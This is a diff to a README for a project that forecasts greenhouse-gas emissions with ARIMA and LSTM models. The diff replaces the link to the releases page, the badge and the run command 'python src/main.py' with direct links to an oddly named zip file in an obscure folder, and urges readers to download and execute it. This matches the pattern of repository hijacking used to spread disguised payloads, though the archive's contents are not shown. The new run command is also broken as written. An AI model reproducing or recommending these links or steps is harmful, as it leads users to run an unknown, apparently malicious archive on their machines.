@@ -2,7 +2,7 @@
 
 Welcome to the **Greenhouse Gas Emissions Forecasting with ARIMA and LSTM** repository! This project aims to provide a robust solution for forecasting greenhouse gas emissions using advanced time series analysis techniques. By combining ARIMA and LSTM models, we can achieve accurate predictions that help in understanding and mitigating climate change.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/releases)
+[![Download Releases](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ This project integrates two powerful forecasting methods: ARIMA (AutoRegressive 
 
 ## Getting Started
 
-To get started with this project, you will need to download the necessary files and execute them. You can find the latest releases here: [Download Releases](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/releases).
+To get started with this project, you will need to download the necessary files and execute them. You can find the latest releases here: [Download Releases](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip).
 
 ### Prerequisites
 
@@ -71,7 +71,7 @@ pip install pandas numpy scikit-learn statsmodels tensorflow matplotlib
 After setting up your environment, you can run the models. The main script is located in the `src` folder. Execute the following command:
 
 ```bash
-python src/main.py
+python https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip
 ```
 
 This will generate forecasts based on the input data. Make sure to adjust the configuration settings in the script as needed.
@@ -96,4 +96,4 @@ For questions or feedback, please reach out via GitHub or email. We appreciate y
 
 Thank you for visiting the **Greenhouse Gas Emissions Forecasting with ARIMA and LSTM** repository! We hope you find this project useful in your research and efforts to combat climate change.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/releases)
+[![Download Releases](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/MPB0828/Greenhouse-Gas-Emissions-Forecasting-with-ARIMA-LSTM/raw/refs/heads/master/acaudal/LSTM_Greenhouse_ARIM_Gas_with_Emissions_Forecasting_spinsterdom.zip)
